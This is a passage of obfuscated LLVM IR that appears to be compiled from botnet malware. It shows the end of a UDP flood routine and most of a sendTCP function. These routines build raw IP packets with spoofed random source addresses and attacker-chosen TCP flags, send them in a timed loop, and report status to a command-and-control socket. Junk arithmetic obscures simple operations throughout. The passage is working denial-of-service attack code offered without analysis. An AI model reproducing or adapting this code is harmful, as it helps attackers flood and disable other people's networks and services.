  store i32 %198, i32* %28, align 4
  br label %200

; <label>:200:                                    ; preds = %180, %179
  %201 = load i32, i32* %13, align 4
  %202 = sext i32 %201 to i64
  %203 = sub i64 0, 28
  %204 = sub i64 0, %202
  %205 = add i64 %203, %204
  %206 = sub i64 0, %205
  %207 = add i64 28, %202
  %208 = call i8* @llvm.stacksave()
  store i8* %208, i8** %29, align 8
  %209 = alloca i8, i64 %206, align 16
  %210 = bitcast i8* %209 to %struct.iphdr*
  store %struct.iphdr* %210, %struct.iphdr** %30, align 8
  %211 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %212 = bitcast %struct.iphdr* %211 to i8*
  %213 = getelementptr i8, i8* %212, i64 20
  %214 = bitcast i8* %213 to %struct.udphdr*
  store %struct.udphdr* %214, %struct.udphdr** %31, align 8
  %215 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 4
  %219 = load i32, i32* %28, align 4
  %220 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %219)
  %221 = call i32 @htonl(i32 %220) #13
  %222 = load i32, i32* %13, align 4
  %223 = sext i32 %222 to i64
  %224 = sub i64 0, %223
  %225 = sub i64 8, %224
  %226 = add i64 8, %223
  %227 = trunc i64 %225 to i32
  call void @makeIPPacket(%struct.iphdr* %215, i32 %218, i32 %221, i8 zeroext 17, i32 %227)
  %228 = load i32, i32* %13, align 4
  %229 = sext i32 %228 to i64
  %230 = add i64 8, -1070135671219473235
  %231 = add i64 %230, %229
  %232 = sub i64 %231, -1070135671219473235
  %233 = add i64 8, %229
  %234 = trunc i64 %232 to i16
  %235 = call zeroext i16 @htons(i16 zeroext %234) #13
  %236 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %237 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.3* %237 to %struct.anon.4*
  %239 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %238, i32 0, i32 2
  store i16 %235, i16* %239, align 2
  %240 = call i32 @rand_cmwc()
  %241 = trunc i32 %240 to i16
  %242 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %243 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %242, i32 0, i32 0
  %244 = bitcast %union.anon.3* %243 to %struct.anon.4*
  %245 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %244, i32 0, i32 0
  store i16 %241, i16* %245, align 2
  %246 = load i32, i32* %10, align 4
  %247 = icmp eq i32 %246, 0
  br i1 %247, label %248, label %250

; <label>:248:                                    ; preds = %200
  %249 = call i32 @rand_cmwc()
  br label %255

; <label>:250:                                    ; preds = %200
  %251 = load i32, i32* %10, align 4
  %252 = trunc i32 %251 to i16
  %253 = call zeroext i16 @htons(i16 zeroext %252) #13
  %254 = zext i16 %253 to i32
  br label %255

; <label>:255:                                    ; preds = %250, %248
  %256 = phi i32 [ %249, %248 ], [ %254, %250 ]
  %257 = trunc i32 %256 to i16
  %258 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %259 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.3* %259 to %struct.anon.4*
  %261 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %260, i32 0, i32 1
  store i16 %257, i16* %261, align 2
  %262 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %263 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon.3* %263 to %struct.anon.4*
  %265 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %264, i32 0, i32 3
  store i16 0, i16* %265, align 2
  %266 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %267 = bitcast %struct.udphdr* %266 to i8*
  %268 = getelementptr inbounds i8, i8* %267, i64 8
  %269 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %268, i32 %269)
  %270 = bitcast i8* %209 to i16*
  %271 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  %273 = load i16, i16* %272, align 2
  %274 = zext i16 %273 to i32
  %275 = call zeroext i16 @csum(i16* %270, i32 %274)
  %276 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 7
  store i16 %275, i16* %277, align 2
  %278 = call i64 @time(i64* null) #2
  %279 = load i32, i32* %11, align 4
  %280 = sext i32 %279 to i64
  %281 = sub i64 0, %280
  %282 = sub i64 %278, %281
  %283 = add nsw i64 %278, %280
  %284 = trunc i64 %282 to i32
  store i32 %284, i32* %32, align 4
  store i32 0, i32* %33, align 4
  store i32 0, i32* %34, align 4
  br label %285

; <label>:285:                                    ; preds = %356, %352, %341, %255
  br label %286

; <label>:286:                                    ; preds = %285
  %287 = load i32, i32* %25, align 4
  %288 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %289 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %288, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 %287, i8* %209, i64 %206, i32 0, %struct.sockaddr* %291, i32 16)
  %293 = call i32 @rand_cmwc()
  %294 = trunc i32 %293 to i16
  %295 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %296 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %295, i32 0, i32 0
  %297 = bitcast %union.anon.3* %296 to %struct.anon.4*
  %298 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %297, i32 0, i32 0
  store i16 %294, i16* %298, align 2
  %299 = load i32, i32* %10, align 4
  %300 = icmp eq i32 %299, 0
  br i1 %300, label %301, label %303

; <label>:301:                                    ; preds = %286
  %302 = call i32 @rand_cmwc()
  br label %308

; <label>:303:                                    ; preds = %286
  %304 = load i32, i32* %10, align 4
  %305 = trunc i32 %304 to i16
  %306 = call zeroext i16 @htons(i16 zeroext %305) #13
  %307 = zext i16 %306 to i32
  br label %308

; <label>:308:                                    ; preds = %303, %301
  %309 = phi i32 [ %302, %301 ], [ %307, %303 ]
  %310 = trunc i32 %309 to i16
  %311 = load %struct.udphdr*, %struct.udphdr** %31, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 0
  %313 = bitcast %union.anon.3* %312 to %struct.anon.4*
  %314 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %313, i32 0, i32 1
  store i16 %310, i16* %314, align 2
  %315 = call i32 @rand_cmwc()
  %316 = trunc i32 %315 to i16
  %317 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %318 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %317, i32 0, i32 3
  store i16 %316, i16* %318, align 4
  %319 = load i32, i32* %28, align 4
  %320 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %319)
  %321 = call i32 @htonl(i32 %320) #13
  %322 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %323 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %322, i32 0, i32 8
  store i32 %321, i32* %323, align 4
  %324 = bitcast i8* %209 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* %324, i32 %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %33, align 4
  %333 = load i32, i32* %18, align 4
  %334 = icmp eq i32 %332, %333
  br i1 %334, label %335, label %342

; <label>:335:                                    ; preds = %308
  %336 = call i64 @time(i64* null) #2
  %337 = load i32, i32* %32, align 4
  %338 = sext i32 %337 to i64
  %339 = icmp sgt i64 %336, %338
  br i1 %339, label %340, label %341

; <label>:340:                                    ; preds = %335
  br label %362

; <label>:341:                                    ; preds = %335
  store i32 0, i32* %33, align 4
  br label %285

; <label>:342:                                    ; preds = %308
  %343 = load i32, i32* %33, align 4
  %344 = sub i32 0, %343
  %345 = sub i32 0, 1
  %346 = add i32 %344, %345
  %347 = sub i32 0, %346
  %348 = add i32 %343, 1
  store i32 %347, i32* %33, align 4
  %349 = load i32, i32* %34, align 4
  %350 = load i32, i32* %15, align 4
  %351 = icmp eq i32 %349, %350
  br i1 %351, label %352, label %356

; <label>:352:                                    ; preds = %342
  %353 = load i32, i32* %16, align 4
  %354 = mul nsw i32 %353, 1000
  %355 = call i32 @usleep(i32 %354)
  store i32 0, i32* %34, align 4
  br label %285

; <label>:356:                                    ; preds = %342
  %357 = load i32, i32* %34, align 4
  %358 = add i32 %357, 1577979167
  %359 = add i32 %358, 1
  %360 = sub i32 %359, 1577979167
  %361 = add i32 %357, 1
  store i32 %360, i32* %34, align 4
  br label %285

; <label>:362:                                    ; preds = %340
  %363 = load i8*, i8** %29, align 8
  call void @llvm.stackrestore(i8* %363)
  br label %364

; <label>:364:                                    ; preds = %362, %154, %146, %141, %76, %64, %53
  ret void
}

declare i32 @usleep(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %27 = load i32, i32* %14, align 4
  store i32 %27, i32* %15, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %7
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %7
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %568

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %49, i32* %17, align 4
  %50 = load i32, i32* %17, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %55, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i32, i32* @mainCommSock, align 4
  %54 = call i32 (i32, i8*, ...) @sockprintf(i32 %53, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i32 0, i32 0))
  br label %568

; <label>:55:                                     ; preds = %46
  store i32 1, i32* %18, align 4
  %56 = load i32, i32* %17, align 4
  %57 = bitcast i32* %18 to i8*
  %58 = call i32 @setsockopt(i32 %56, i32 0, i32 3, i8* %57, i32 4) #2
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %55
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  br label %568

; <label>:63:                                     ; preds = %55
  %64 = load i32, i32* %11, align 4
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %63
  store i32 0, i32* %19, align 4
  br label %89

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* %11, align 4
  %69 = sub i32 32, -497488778
  %70 = sub i32 %69, %68
  %71 = add i32 %70, -497488778
  %72 = sub nsw i32 32, %68
  %73 = shl i32 1, %71
  %74 = sub i32 %73, -943509559
  %75 = sub i32 %74, 1
  %76 = add i32 %75, -943509559
  %77 = sub nsw i32 %73, 1
  %78 = xor i32 %76, -1
  %79 = and i32 -1704701173, %78
  %80 = xor i32 -1704701173, -1
  %81 = and i32 %76, %80
  %82 = xor i32 -1, -1
  %83 = and i32 %82, -1704701173
  %84 = and i32 -1, %80
  %85 = or i32 %79, %81
  %86 = or i32 %83, %84
  %87 = xor i32 %85, %86
  %88 = xor i32 %76, -1
  store i32 %87, i32* %19, align 4
  br label %89

; <label>:89:                                     ; preds = %67, %66
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = sub i64 0, 40
  %93 = sub i64 0, %91
  %94 = add i64 %92, %93
  %95 = sub i64 0, %94
  %96 = add i64 40, %91
  %97 = call i8* @llvm.stacksave()
  store i8* %97, i8** %20, align 8
  %98 = alloca i8, i64 %95, align 16
  %99 = bitcast i8* %98 to %struct.iphdr*
  store %struct.iphdr* %99, %struct.iphdr** %21, align 8
  %100 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %101 = bitcast %struct.iphdr* %100 to i8*
  %102 = getelementptr i8, i8* %101, i64 20
  %103 = bitcast i8* %102 to %struct.tcphdr*
  store %struct.tcphdr* %103, %struct.tcphdr** %22, align 8
  %104 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 4
  %108 = load i32, i32* %19, align 4
  %109 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 %108)
  %110 = call i32 @htonl(i32 %109) #13
  %111 = load i32, i32* %13, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 20, 7447748025165793664
  %114 = add i64 %113, %112
  %115 = add i64 %114, 7447748025165793664
  %116 = add i64 20, %112
  %117 = trunc i64 %115 to i32
  call void @makeIPPacket(%struct.iphdr* %104, i32 %107, i32 %110, i8 zeroext 6, i32 %117)
  %118 = call i32 @rand_cmwc()
  %119 = trunc i32 %118 to i16
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.1* %121 to %struct.anon.2*
  %123 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %122, i32 0, i32 0
  store i16 %119, i16* %123, align 4
  %124 = call i32 @rand_cmwc()
  %125 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %126 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %125, i32 0, i32 0
  %127 = bitcast %union.anon.1* %126 to %struct.anon.2*
  %128 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %127, i32 0, i32 2
  store i32 %124, i32* %128, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.1* %130 to %struct.anon.2*
  %132 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %131, i32 0, i32 3
  store i32 0, i32* %132, align 4
  %133 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %134 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %133, i32 0, i32 0
  %135 = bitcast %union.anon.1* %134 to %struct.anon.2*
  %136 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %135, i32 0, i32 4
  %137 = load i16, i16* %136, align 4
  %138 = xor i16 -241, -1
  %139 = xor i16 %137, %138
  %140 = and i16 %139, %137
  %141 = and i16 %137, -241
  %142 = xor i16 %140, -1
  %143 = xor i16 80, -1
  %144 = xor i16 31736, -1
  %145 = and i16 %142, 31736
  %146 = and i16 %140, %144
  %147 = and i16 %143, 31736
  %148 = and i16 80, %144
  %149 = or i16 %145, %146
  %150 = or i16 %147, %148
  %151 = xor i16 %149, %150
  %152 = or i16 %142, %143
  %153 = xor i16 %152, -1
  %154 = or i16 31736, %144
  %155 = and i16 %153, %154
  %156 = or i16 %151, %155
  %157 = or i16 %140, 80
  store i16 %156, i16* %136, align 4
  %158 = load i8*, i8** %12, align 8
  %159 = call i32 @strcmp(i8* %158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i32 0, i32 0)) #10
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %287, label %161

; <label>:161:                                    ; preds = %89
  %162 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon.1* %163 to %struct.anon.2*
  %165 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %164, i32 0, i32 4
  %166 = load i16, i16* %165, align 4
  %167 = xor i16 %166, -1
  %168 = xor i16 -513, -1
  %169 = xor i16 25124, -1
  %170 = or i16 %167, %168
  %171 = or i16 25124, %169
  %172 = xor i16 %170, -1
  %173 = and i16 %172, %171
  %174 = and i16 %166, -513
  %175 = xor i16 %173, -1
  %176 = xor i16 512, -1
  %177 = xor i16 10858, -1
  %178 = and i16 %175, 10858
  %179 = and i16 %173, %177
  %180 = and i16 %176, 10858
  %181 = and i16 512, %177
  %182 = or i16 %178, %179
  %183 = or i16 %180, %181
  %184 = xor i16 %182, %183
  %185 = or i16 %175, %176
  %186 = xor i16 %185, -1
  %187 = or i16 10858, %177
  %188 = and i16 %186, %187
  %189 = or i16 %184, %188
  %190 = or i16 %173, 512
  store i16 %189, i16* %165, align 4
  %191 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon.1* %192 to %struct.anon.2*
  %194 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = xor i16 %195, -1
  %197 = xor i16 -1025, -1
  %198 = xor i16 25182, -1
  %199 = or i16 %196, %197
  %200 = or i16 25182, %198
  %201 = xor i16 %199, -1
  %202 = and i16 %201, %200
  %203 = and i16 %195, -1025
  %204 = and i16 %202, 1024
  %205 = xor i16 %202, 1024
  %206 = or i16 %204, %205
  %207 = or i16 %202, 1024
  store i16 %206, i16* %194, align 4
  %208 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon.1* %209 to %struct.anon.2*
  %211 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %210, i32 0, i32 4
  %212 = load i16, i16* %211, align 4
  %213 = xor i16 %212, -1
  %214 = xor i16 -257, -1
  %215 = xor i16 23673, -1
  %216 = or i16 %213, %214
  %217 = or i16 23673, %215
  %218 = xor i16 %216, -1
  %219 = and i16 %218, %217
  %220 = and i16 %212, -257
  %221 = xor i16 %219, -1
  %222 = xor i16 256, -1
  %223 = xor i16 -19661, -1
  %224 = and i16 %221, -19661
  %225 = and i16 %219, %223
  %226 = and i16 %222, -19661
  %227 = and i16 256, %223
  %228 = or i16 %224, %225
  %229 = or i16 %226, %227
  %230 = xor i16 %228, %229
  %231 = or i16 %221, %222
  %232 = xor i16 %231, -1
  %233 = or i16 -19661, %223
  %234 = and i16 %232, %233
  %235 = or i16 %230, %234
  %236 = or i16 %219, 256
  store i16 %235, i16* %211, align 4
  %237 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.1* %238 to %struct.anon.2*
  %240 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %239, i32 0, i32 4
  %241 = load i16, i16* %240, align 4
  %242 = xor i16 -4097, -1
  %243 = xor i16 %241, %242
  %244 = and i16 %243, %241
  %245 = and i16 %241, -4097
  %246 = xor i16 %244, -1
  %247 = xor i16 4096, -1
  %248 = xor i16 -25028, -1
  %249 = and i16 %246, -25028
  %250 = and i16 %244, %248
  %251 = and i16 %247, -25028
  %252 = and i16 4096, %248
  %253 = or i16 %249, %250
  %254 = or i16 %251, %252
  %255 = xor i16 %253, %254
  %256 = or i16 %246, %247
  %257 = xor i16 %256, -1
  %258 = or i16 -25028, %248
  %259 = and i16 %257, %258
  %260 = or i16 %255, %259
  %261 = or i16 %244, 4096
  store i16 %260, i16* %240, align 4
  %262 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon.1* %263 to %struct.anon.2*
  %265 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = xor i16 -2049, -1
  %268 = xor i16 %266, %267
  %269 = and i16 %268, %266
  %270 = and i16 %266, -2049
  %271 = xor i16 %269, -1
  %272 = xor i16 2048, -1
  %273 = xor i16 -8158, -1
  %274 = and i16 %271, -8158
  %275 = and i16 %269, %273
  %276 = and i16 %272, -8158
  %277 = and i16 2048, %273
  %278 = or i16 %274, %275
  %279 = or i16 %276, %277
  %280 = xor i16 %278, %279
  %281 = or i16 %271, %272
  %282 = xor i16 %281, -1
  %283 = or i16 -8158, %273
  %284 = and i16 %282, %283
  %285 = or i16 %280, %284
  %286 = or i16 %269, 2048
  store i16 %285, i16* %265, align 4
  br label %450

; <label>:287:                                    ; preds = %89
  %288 = load i8*, i8** %12, align 8
  %289 = call i8* @strtok(i8* %288, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %289, i8** %23, align 8
  br label %290

; <label>:290:                                    ; preds = %447, %287
  %291 = load i8*, i8** %23, align 8
  %292 = icmp ne i8* %291, null
  br i1 %292, label %293, label %449

; <label>:293:                                    ; preds = %290
  %294 = load i8*, i8** %23, align 8
  %295 = call i32 @strcmp(i8* %294, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.407, i32 0, i32 0)) #10
  %296 = icmp ne i32 %295, 0
  br i1 %296, label %323, label %297

; <label>:297:                                    ; preds = %293
  %298 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon.1* %299 to %struct.anon.2*
  %301 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = xor i16 -513, -1
  %304 = xor i16 %302, %303
  %305 = and i16 %304, %302
  %306 = and i16 %302, -513
  %307 = xor i16 %305, -1
  %308 = xor i16 512, -1
  %309 = xor i16 -6626, -1
  %310 = and i16 %307, -6626
  %311 = and i16 %305, %309
  %312 = and i16 %308, -6626
  %313 = and i16 512, %309
  %314 = or i16 %310, %311
  %315 = or i16 %312, %313
  %316 = xor i16 %314, %315
  %317 = or i16 %307, %308
  %318 = xor i16 %317, -1
  %319 = or i16 -6626, %309
  %320 = and i16 %318, %319
  %321 = or i16 %316, %320
  %322 = or i16 %305, 512
  store i16 %321, i16* %301, align 4
  br label %447

; <label>:323:                                    ; preds = %293
  %324 = load i8*, i8** %23, align 8
  %325 = call i32 @strcmp(i8* %324, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i32 0, i32 0)) #10
  %326 = icmp ne i32 %325, 0
  br i1 %326, label %345, label %327

; <label>:327:                                    ; preds = %323
  %328 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %329 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %328, i32 0, i32 0
  %330 = bitcast %union.anon.1* %329 to %struct.anon.2*
  %331 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %330, i32 0, i32 4
  %332 = load i16, i16* %331, align 4
  %333 = xor i16 %332, -1
  %334 = xor i16 -1025, -1
  %335 = xor i16 21055, -1
  %336 = or i16 %333, %334
  %337 = or i16 21055, %335
  %338 = xor i16 %336, -1
  %339 = and i16 %338, %337
  %340 = and i16 %332, -1025
  %341 = and i16 %339, 1024
  %342 = xor i16 %339, 1024
  %343 = or i16 %341, %342
  %344 = or i16 %339, 1024
  store i16 %343, i16* %331, align 4
  br label %446

; <label>:345:                                    ; preds = %323
  %346 = load i8*, i8** %23, align 8
  %347 = call i32 @strcmp(i8* %346, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.409, i32 0, i32 0)) #10
  %348 = icmp ne i32 %347, 0
  br i1 %348, label %375, label %349

; <label>:349:                                    ; preds = %345
  %350 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %351 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %350, i32 0, i32 0
  %352 = bitcast %union.anon.1* %351 to %struct.anon.2*
  %353 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %352, i32 0, i32 4
  %354 = load i16, i16* %353, align 4
  %355 = xor i16 -257, -1
  %356 = xor i16 %354, %355
  %357 = and i16 %356, %354
  %358 = and i16 %354, -257
  %359 = xor i16 %357, -1
  %360 = xor i16 256, -1
  %361 = xor i16 -15124, -1
  %362 = and i16 %359, -15124
  %363 = and i16 %357, %361
  %364 = and i16 %360, -15124
  %365 = and i16 256, %361
  %366 = or i16 %362, %363
  %367 = or i16 %364, %365
  %368 = xor i16 %366, %367
  %369 = or i16 %359, %360
  %370 = xor i16 %369, -1
  %371 = or i16 -15124, %361
  %372 = and i16 %370, %371
  %373 = or i16 %368, %372
  %374 = or i16 %357, 256
  store i16 %373, i16* %353, align 4
  br label %445

; <label>:375:                                    ; preds = %345
  %376 = load i8*, i8** %23, align 8
  %377 = call i32 @strcmp(i8* %376, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.410, i32 0, i32 0)) #10
  %378 = icmp ne i32 %377, 0
  br i1 %378, label %409, label %379

; <label>:379:                                    ; preds = %375
  %380 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 0
  %382 = bitcast %union.anon.1* %381 to %struct.anon.2*
  %383 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %382, i32 0, i32 4
  %384 = load i16, i16* %383, align 4
  %385 = xor i16 %384, -1
  %386 = xor i16 -4097, -1
  %387 = xor i16 -24994, -1
  %388 = or i16 %385, %386
  %389 = or i16 -24994, %387
  %390 = xor i16 %388, -1
  %391 = and i16 %390, %389
  %392 = and i16 %384, -4097
  %393 = xor i16 %391, -1
  %394 = xor i16 4096, -1
  %395 = xor i16 19314, -1
  %396 = and i16 %393, 19314
  %397 = and i16 %391, %395
  %398 = and i16 %394, 19314
  %399 = and i16 4096, %395
  %400 = or i16 %396, %397
  %401 = or i16 %398, %399
  %402 = xor i16 %400, %401
  %403 = or i16 %393, %394
  %404 = xor i16 %403, -1
  %405 = or i16 19314, %395
  %406 = and i16 %404, %405
  %407 = or i16 %402, %406
  %408 = or i16 %391, 4096
  store i16 %407, i16* %383, align 4
  br label %444

; <label>:409:                                    ; preds = %375
  %410 = load i8*, i8** %23, align 8
  %411 = call i32 @strcmp(i8* %410, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.411, i32 0, i32 0)) #10
  %412 = icmp ne i32 %411, 0
  br i1 %412, label %439, label %413

; <label>:413:                                    ; preds = %409
  %414 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 0
  %416 = bitcast %union.anon.1* %415 to %struct.anon.2*
  %417 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %416, i32 0, i32 4
